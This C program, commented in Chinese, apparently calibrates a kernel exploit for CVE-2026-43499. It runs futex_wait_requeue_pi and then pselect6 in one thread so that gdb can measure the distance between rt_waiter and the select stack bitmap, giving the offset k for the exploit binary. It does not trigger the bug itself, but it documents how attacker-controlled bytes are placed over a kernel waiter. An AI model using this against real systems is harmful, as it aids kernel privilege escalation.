/*
 * kstack-depth.c —— 量 CVE-2026-43499 需要的栈偏移 k
 * ============================================================================
 *
 * 目的只有一个：让同一个线程先后进入
 *
 *      futex_wait_requeue_pi()      -> 栈上有 struct rt_mutex_waiter rt_waiter
 *      core_sys_select()            -> 栈上有 long stack_fds[32]
 *
 * 并且在里面停够久，好让 gdb 读到这两个局部变量的地址，然后
 *
 *      k = ( &rt_waiter - &stack_fds ) / 8
 *
 * 就是 cve-2026-43499 的 -k 参数。两次必须在同一线程（同一内核栈顶），
 * 所以本程序单线程顺序执行，不 fork、不建 pthread。
 *
 * ----------------------------------------------------------------------------
 *  编译
 * ----------------------------------------------------------------------------
 *      gcc -O2 -Wall -Wextra -std=gnu99 -o kstack-depth kstack-depth.c
 *
 * ----------------------------------------------------------------------------
 *  跑法（QEMU 必须带 -s 和 nokaslr）
 * ----------------------------------------------------------------------------
 *      qemu-system-aarch64 ... -s nokaslr
 *
 *      gdb-multiarch vmlinux
 *      (gdb) set pagination off
 *      (gdb) target remote :1234
 *      (gdb) b futex_wait_requeue_pi
 *      (gdb) b core_sys_select
 *      (gdb) c
 *      ......
 *      (gdb) p/x &rt_waiter
 *      (gdb) set $A = (unsigned long)&rt_waiter
 *      (gdb) c
 *      ......
 *      (gdb) p/x &stack_fds
 *      (gdb) set $B = (unsigned long)&stack_fds
 *      (gdb) p/d ($A - $B) / 8
 *
 * 也可以把上面几行存成 k.gdb，然后
 *      gdb-multiarch vmlinux -x k.gdb
 *
 * ----------------------------------------------------------------------------
 *  为什么一定要 nokaslr
 * ----------------------------------------------------------------------------
 *  k 本身与基址无关（栈顶会约掉），但 gdb 要靠 vmlinux 里的符号下断点；
 *  KASLR 打开后实际代码地址与符号表对不上，断点会挂空。
 *
 * ----------------------------------------------------------------------------
 *  如果 CONFIG_DEBUG_INFO=n
 * ----------------------------------------------------------------------------
 *  gdb 认不出 rt_waiter / stack_fds 这种局部变量，只能退回反汇编手算：
 *  prologue 的 sub sp, sp, #N 是帧大小，add xN, sp, #off 是数组相对位置，
 *  两者按调用链累加后相减。本程序仍然有用 —— 它负责把内核停在那两个帧里。
 *
 * ----------------------------------------------------------------------------
 *  读完记得
 * ----------------------------------------------------------------------------
 *  k 量出来之后，用 ./cve-2026-43499 -k <k> 跑正式那一次；本程序自身不触发
 *  漏洞、不写内核内存，只调用两个 syscall 然后正常返回，可以在任何内核上跑。
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

/* linux/futex.h 里有，但为了不依赖头文件版本，缺了就用字面值 */
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI  11
#endif
#ifndef FUTEX_PRIVATE_FLAG
#define FUTEX_PRIVATE_FLAG     128
#endif
#ifndef FUTEX_BITSET_MATCH_ANY
#define FUTEX_BITSET_MATCH_ANY 0xffffffffu
#endif

/* core_sys_select()：nfds=320 -> size=40，6*40=240 <= 256，走栈。
 * 再大一点 size 就超过 42，内核改用 kvmalloc，stack_fds 就不再被用到。 */
#define NFDS        320
#define WORDS       15                  /* 3 组位图 × 5 word = 120 字节 */

/* 把日志 fd 挪到 900+，免得被 dup2 到 0..319 时顶掉 */
#define FD_RESERVE  900

static int g_log = 2;

static void say(const char *fmt, ...)
{
    va_list ap;
    char buf[512];
    int n;

    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    if (n > 0)
        (void)!write(g_log, buf, (size_t)n);
}

/* futex 的 timeout 是「绝对时间戳」（CLOCK_MONOTONIC），pselect6 的是
 * 「相对时长」—— 两者语义相反，绝不能共用一个转换函数。搞反了 pselect6
 * 会以为要等几百万秒，永远不返回。 */
static void abs_deadline(int ms, struct timespec *ts)
{
    clock_gettime(CLOCK_MONOTONIC, ts);
    ts->tv_nsec += (long)ms * 1000000L;

    while (ts->tv_nsec >= 1000000000L) {
        ts->tv_nsec -= 1000000000L;
        ts->tv_sec  += 1;
    }
}

static void rel_duration(int ms, struct timespec *ts)
{
    ts->tv_sec  = ms / 1000;
    ts->tv_nsec = (long)(ms % 1000) * 1000000L;
}

/* ---------------------------------------------------------------------------
 * 阶段 A：进入 futex_wait_requeue_pi()
 * ---------------------------------------------------------------------------
 *  FUTEX_WAIT_REQUEUE_PI 是唯一一个直接调用 futex_wait_requeue_pi() 的 op，
 *  真正漏洞路径（FUTEX_CMP_REQUEUE_PI）只让别的线程进 requeue 分支，waiter
 *  所属线程走的还是这里。栈帧完全一样，所以量 A 用它。
 *
 *  三个必须满足的入参条件（否则函数一进门就 -EINVAL/-EAGAIN 返回，
 *  虽然断点还是会命中，但帧活得太短，不利于观察）：
 *      *uaddr  == val                否则 EAGAIN
 *      *uaddr2 == 0                  否则 EDEADLK
 *      bitset  != 0                  否则 EINVAL（val3 就是 bitset）
 */
static int phase_futex(int ms)
{
    void *p;
    uint32_t *uaddr, *uaddr2;
    struct timespec ts;
    long r;

    p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {
        say("[A] mmap 失败: %s\n", strerror(errno));
        return -1;
    }

    uaddr  = (uint32_t *)p;
    uaddr2 = (uint32_t *)((char *)p + 128);

    *uaddr  = 0x1234;
    *uaddr2 = 0;

    abs_deadline(ms, &ts);

    say("[A] futex_wait_requeue_pi：uaddr=%p uaddr2=%p 挂 %d ms\n",
        (void *)uaddr, (void *)uaddr2, ms);

    r = syscall(SYS_futex,
                uaddr, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                0x1234, &ts, uaddr2, FUTEX_BITSET_MATCH_ANY);

    say("[A] 返回 %ld errno=%d (%s)\n", r, errno, strerror(errno));
    return 0;
}

/* ---------------------------------------------------------------------------
 * 阶段 B：进入 core_sys_select()
 * ---------------------------------------------------------------------------
 *  pselect6 -> do_pselect -> core_sys_select。nfds=320 时
 *      size = FDS_BYTES(320) = 40
 *      bits = stack_fds                       （40 <= 256/6 = 42，走栈）
 *      fds.in/out/ex = bits + 0/40/80
 *  所以传同一个位图指针三次，内核会各拷 40 字节到 stack_fds 的三个位置，
 *  拼起来就是连续 120 字节 —— 与 exploit 里的布局一致。
 *
 *  低位 fd 全部 dup2 成同一个空管道读端，位图取任意值都不会误判 ready，
 *  pselect6 才会稳定睡满超时，而不是立刻 EBADF 返回。
 */
static int phase_select(int ms)
{
    int p[2], rhi, whi;
    uint64_t *blob;
    struct timespec ts;
    long r;
    int i;

    blob = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (blob == MAP_FAILED) {
        say("[B] mmap 失败: %s\n", strerror(errno));
        return -1;
    }

    for (i = 0; i < WORDS; i++)
        blob[i] = ~0ULL;

    if (pipe(p) < 0) {
        say("[B] pipe 失败: %s\n", strerror(errno));
        return -1;
    }

    rhi = fcntl(p[0], F_DUPFD, FD_RESERVE + 10);
    if (rhi < 0) {
        say("[B] F_DUPFD 失败: %s\n", strerror(errno));
        return -1;
    }

    /* 写端也必须先搬到高位：它原本的 fd 很可能就落在 0..319 里，
     * 被 dup2 顶掉后管道没了写者，所有读端立刻 HUP，位图全 1 时
     * pselect6 会当场返回 320，栈帧提前释放。 */
    whi = fcntl(p[1], F_DUPFD, FD_RESERVE + 20);
    if (whi < 0) {
        say("[B] F_DUPFD(write) 失败: %s\n", strerror(errno));
        return -1;
    }

    for (i = 0; i < NFDS; i++) {
        if (i == rhi || i == whi || i == g_log)
            continue;
        if (dup2(rhi, i) < 0) {
            say("[B] dup2(%d) 失败: %s\n", i, strerror(errno));
            return -1;
        }
    }

    rel_duration(ms, &ts);

    say("[B] pselect6：nfds=%d 位图=%p 挂 %d ms\n", NFDS, (void *)blob, ms);

    r = syscall(SYS_pselect6, NFDS, blob, blob, blob, &ts, NULL);

    say("[B] 返回 %ld errno=%d (%s)\n", r, errno, strerror(errno));
    return 0;
}

static void usage(const char *argv0)
{
    fprintf(stderr,
        "用法: %s [-t ms]\n"
        "\n"
        "  -t ms   每个阶段阻塞多少毫秒（默认 5000），够 gdb 停下来读地址\n"
        "  -h      显示本帮助\n"
        "\n"
        "流程: 先 futex_wait_requeue_pi，再 core_sys_select，同一线程。\n"
        "gdb 里依次读 &rt_waiter 与 &stack_fds，k = (A - B) / 8。\n",
        argv0);
}

int main(int argc, char **argv)
{
    int ms = 5000;
    int i;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-t") && i + 1 < argc) {
            ms = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-h")) {
            usage(argv[0]);
            return 0;
        } else {
            usage(argv[0]);
            return 2;
        }
    }

    if (ms < 500)
        ms = 500;

    /* stderr 复制到高位：阶段 B 会把 0..319 全 dup2 掉 */
    g_log = fcntl(2, F_DUPFD, FD_RESERVE);
    if (g_log < 0)
        g_log = 2;

    say("==== kstack-depth ====\n");
    say("pid=%d tid=%d\n", (int)getpid(), (int)syscall(SYS_gettid));
    say("两阶段在同一线程跑，栈顶相同；每阶段挂 %d ms\n\n", ms);

    if (phase_futex(ms) < 0)
        return 1;

    usleep(300000);

    if (phase_select(ms) < 0)
        return 1;

    say("\n两阶段结束。若 gdb 两次都命中，k = (A - B) / 8\n");
    return 0;
}
